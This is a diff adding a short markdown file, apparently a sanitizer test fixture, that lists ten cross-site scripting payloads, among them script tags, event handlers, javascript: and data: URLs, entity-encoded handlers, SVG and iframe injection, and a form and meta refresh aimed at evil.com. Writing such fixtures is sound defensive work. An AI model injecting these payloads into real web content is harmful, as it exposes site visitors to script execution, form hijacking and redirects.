@@ -1,0 +1,21 @@
+# XSS Attack Vectors
+
+Inline script: <script>alert('xss')</script>
+
+Event handler: <img src=x onerror="alert('xss')">
+
+JavaScript URL: [click me](javascript:alert('xss'))
+
+Data URL: <a href="data:text/html,<script>alert('xss')</script>">link</a>
+
+Encoded: <img src="x" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;xss&#39;&#41;">
+
+SVG injection: <svg onload="alert('xss')">
+
+Nested: <div><iframe src="javascript:alert('xss')"></iframe></div>
+
+Style injection: <div style="background:url('javascript:alert(1)')">styled</div>
+
+Form hijack: <form action="https://evil.com"><input type="submit"></form>
+
+Meta refresh: <meta http-equiv="refresh" content="0;url=https://evil.com">
